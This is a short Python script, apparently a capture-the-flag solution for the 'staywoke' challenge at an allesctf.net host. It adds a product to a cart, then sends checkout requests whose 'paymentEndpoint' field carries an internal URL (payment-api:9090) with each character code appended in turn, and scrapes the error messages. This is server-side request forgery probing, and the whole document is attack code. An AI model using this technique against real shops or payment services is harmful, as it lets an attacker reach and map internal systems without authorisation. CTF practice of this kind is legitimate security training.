import requests
import urllib
import html
endpoint = "checkout"
url = "http://staywoke.hax1.allesctf.net/"
s = requests.Session()

r = s.post(url+"products/2")

for i in range(0x7f):
    payload = {
    'payment': 'w0kecoin',
    'account': '0',
    'paymentEndpoint': 'http://payment-api:9090/%c' %(i)
    }
    print("Test: %d" %(i))

    req = requests.Request('POST', url+endpoint,
        headers= {
            'Conten-Type':'application/json'
        },
        json = payload,
        cookies = s.cookies
    )
    prepped = req.prepare()
    r = s.send(prepped)
    print((html.unescape(r.text.split('alert bad">')[1].split("</div")[0])))
